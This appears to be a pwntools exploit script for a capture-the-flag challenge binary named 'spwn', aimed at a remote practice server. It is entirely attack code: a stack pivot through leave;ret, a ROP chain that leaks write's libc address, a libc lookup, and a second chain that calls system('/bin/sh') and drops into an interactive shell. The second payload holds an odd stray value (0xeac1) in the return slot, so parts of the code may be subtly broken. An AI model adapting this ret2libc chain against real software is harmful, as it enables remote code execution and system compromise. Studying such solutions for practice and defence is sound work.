from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
p = process('./spwn')
elf = ELF('./spwn')
p = remote('node5.buuoj.cn',29061)

leave_ret = 0x08048511
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.symbols['main']
s_addr = elf.symbols['s']
payload_1 = p32(0) + p32(write_plt) + p32(main_addr) +p32(1) + p32(write_got) + p32(4)
p.sendlineafter(b'What is your name?',payload_1)

payload_2 = b'b'*24 + p32(s_addr) + p32(leave_ret)
p.sendlineafter(b'What do you want to say?',payload_2)

write_addr = u32(p.recvuntil(b'\xf7'))

print(hex(write_addr))

libc =  LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

payload_1 = p32(0) + p32(0xeac1) + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
p.sendlineafter(b'What is your name?',payload_1)
p.sendlineafter(b'What do you want to say?',payload_2)

p.interactive()
